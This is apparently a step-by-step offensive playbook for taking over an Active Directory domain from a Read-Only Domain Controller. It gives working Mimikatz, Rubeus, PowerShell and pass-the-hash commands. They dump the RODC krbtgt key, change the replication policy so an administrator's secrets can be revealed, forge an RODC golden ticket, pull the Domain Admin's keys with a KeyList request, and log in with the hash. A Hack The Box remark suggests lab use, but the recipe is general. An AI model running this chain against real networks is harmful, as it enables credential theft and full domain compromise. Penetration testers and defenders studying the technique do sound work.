# RODC Golden Ticket + KeyList -> Domain Admin hash

**Trigger:** You have local admin on a Read-Only Domain Controller (or its
`krbtgt_<number>` key) and need a Domain Admin's NT hash, e.g. an internal
RODC reachable only through a pivot.

## Procedure

1. **Extract the RODC krbtgt key.** On the RODC with admin code exec:
   `mimikatz.exe "lsadump::dcsync /user:<DOMAIN>\krbtgt_<RODC_NUMBER>"` or
   dump `ntds.dit`+`SYSTEM` offline. Record the AES256 key and the RODC
   number (from `msDS-SecondaryKrbTgtNumber` / account name).
2. **Allow the target DA to replicate to the RODC.** As the delegated
   writer (e.g. Tier1 user with `WriteAccountRestrictions` on the RODC
   computer object):
   ```powershell
   Set-ADComputer RODC01 -Add @{
     "msDS-RevealOnDemandGroup" = "CN=Administrator,CN=Users,DC=corp,DC=local"
   }
   Set-ADComputer RODC01 -Clear "msDS-NeverRevealGroup"
   ```
   Without this the DC rejects the KeyList request (`KDC_ERR_TGT_REVOKED`).
3. **Forge a RODC golden ticket (Rubeus >= 2.3.3).**
   ```powershell
   .\Rubeus.exe golden /rodcNumber:<N> /aes256:<RODC_KEY> \
     /flags:forwardable,renewable,enc_pa_rep /nowrap \
     /user:Administrator /id:500 /domain:<DOMAIN> \
     /sid:S-1-5-21-...-...
   ```
   Impacket `ticketer` encodes the KVNO wrong for RODC tickets
   (`BAD_INTEGRITY`) - use Rubeus.
4. **KeyList request** (MS-KILE 3.3.5.7.5) with the forged TGT:
   ```powershell
   .\Rubeus.exe asktgs /enctype:aes256 /keyList \
     /service:krbtgt/<DOMAIN> /dc:<DC>.<DOMAIN> \
     /ticket:<base64_or_kirbi> /nowrap
   ```
   The DC sees an RODC-signed ticket for an allowed principal and returns
   the target's long-term keys (RC4/NTLM + AES256).
5. **Pass-the-hash** to any DC: `nxc winrm <ip> -u Administrator -H <hash>`,
   `evil-winrm -i <ip> -u Administrator -H <hash>`, or
   `impacket-wmiexec <domain>/Administrator@<ip> -hashes :<hash>`.

## Pitfalls
- RODC golden tickets are only honored for principals in the RODC's
  Password Replication Policy allow-list; modify PRP first.
- Sync clocks (~Kerberos skew) before Rubeus/getST; HTB boxes often skew 8h.
- Do not change the RODC machine-account password.
- If the Administrator hash is already published for a static lab image,
  verify PtH first - it is a 5-second check before the whole RODC path.
